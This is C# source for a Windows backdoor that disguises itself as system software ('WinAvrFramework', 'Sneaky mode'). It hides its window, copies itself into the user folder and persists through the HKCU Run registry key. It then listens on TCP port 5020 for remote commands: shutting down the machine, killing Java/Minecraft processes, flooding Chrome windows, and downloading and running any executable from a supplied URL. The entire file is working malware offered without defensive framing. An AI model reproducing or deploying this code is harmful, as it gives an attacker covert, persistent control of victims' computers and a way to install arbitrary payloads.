using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Net;

// Namespace to look alike Windows built in software (Sneaky mode)

namespace WinAvrFramework
{
    public partial class Form1 : Form
    {
        RegistryKey registryContents = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        public static bool inRegistry;

        public Form1()
        {
            InitializeComponent();

            if (registryContents.GetValue("WinAvrFramework") == null)
            {
                inRegistry = false;
            }
            else
            {
                inRegistry = true;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Size = new Size(0, 0);

            string currentDirectory = Directory.GetCurrentDirectory();

            if (currentDirectory == @"C:\Users\" + Environment.UserName)
            {
                if (!inRegistry)
                {
                    registryContents.SetValue("WinAvrFramework", @"C:\Users\" + Environment.UserName + @"\WinAvrFramework.exe");
                } 
            }
            else
            {
                if (!File.Exists(@"C:\Users\" + Environment.UserName + @"\WinAvrFramework.exe"))
                {
                    File.Copy("WinAvrFramework.exe", @"C:\Users\" + Environment.UserName + @"\WinAvrFramework.exe", true);
                }

                if (!inRegistry)
                {
                    registryContents.SetValue("WinAvrFramework", @"C:\Users\" + Environment.UserName + @"\WinAvrFramework.exe");
                }
            }

            Process[] instances = Process.GetProcessesByName("WinAvrFramework");

            foreach (Process instance in instances)
            {
                if (instance.Id != Process.GetCurrentProcess().Id)
                {
                    instance.Kill();
                }
            }

            Thread startThread = new Thread(new ThreadStart(StartMethod));
            startThread.Start();
        }

        void StartMethod()
        {
            // Want to listen for all IPs, not just one. For now ignoring deprecation notice.

            TcpListener tcpListener = new TcpListener(5020);

            tcpListener.Start();
            Socket mySocket = tcpListener.AcceptSocket();

            while (true)
            {
                try
                {
                    NetworkStream myns = new NetworkStream(mySocket);
                    StreamReader mysr = new StreamReader(myns);
                    string command = mysr.ReadLine();

                    Execute(command);
                }
                catch (Exception) { }
            }
        }

        void Execute(string command)
        {
            // Shutdown computer
            if (command == "shutdown")
            {
                Process.Start("calc.exe");
                Process.Start("shutdown", "/s /t 0");
            }

            // Finds all running Java processes, closes them if running
            else if (command == "minecraft")
            {
                Process[] lunarClient = Process.GetProcessesByName("Lunar Client");
                Process[] javaw = Process.GetProcessesByName("javaw");
                Process[] java = Process.GetProcessesByName("java");

                if (lunarClient.Length > 0)
                {
                    foreach (Process instance in lunarClient)
                    {
                        instance.Kill();
                    }
                }

                if (javaw.Length > 0)
                {
                    foreach (Process instance in javaw)
                    {
                        instance.Kill();
                    }
                }

                if (java.Length > 0)
                {
                    foreach (Process instance in java)
                    {
                        instance.Kill();
                    }
                }
            }

            // Opens 100 pictures of monkeys via memory-hogging Chromium
            else if (command == "monke")
            {
                string[] monkes = { "https://i.kym-cdn.com/entries/icons/original/000/020/633/le_monke.jpg", "https://img.jakpost.net/c/2017/09/12/2017_09_12_32421_1505189647._large.jpg", "https://www.bostonherald.com/wp-content/uploads/2020/05/GettyImages-824860820.jpg", "https://media.communities.win/post/K9Xs1RRd.gif" };

                for (int i = 0; i < 25; i++)
                {
                    try
                    {
                        foreach (string monkeyUrl in monkes)
                        {
                            Process.Start("chrome.exe", "/new-window \"" + monkeyUrl + "\"");
                        }
                    }
                    catch (Exception ex)
                    {
                        break;
                    }
                }
            }

            // Stops backdoor until next boot
            else if (command == "stop")
            {
                Process[] instances = Process.GetProcessesByName("WinAvrFramework");

                foreach (Process instance in instances)
                {
                    instance.Kill();
                }
            }
            
            // Downloads an executable with the link provided, then runs it
            else
            {
                try
                {
                    var client = new WebClient();

                    string[] fileNameList = command.Split('/');
                    string fileName = (fileNameList[fileNameList.Length - 1]);

                    client.DownloadFile(command, @"C:\Users\" + Environment.UserName + "\\" + fileName + ".exe");
                    Process.Start(@"C:\Users\" + Environment.UserName + "\\" + fileName + ".exe");
                }
                catch (Exception) { }
            }
        }
    }
}
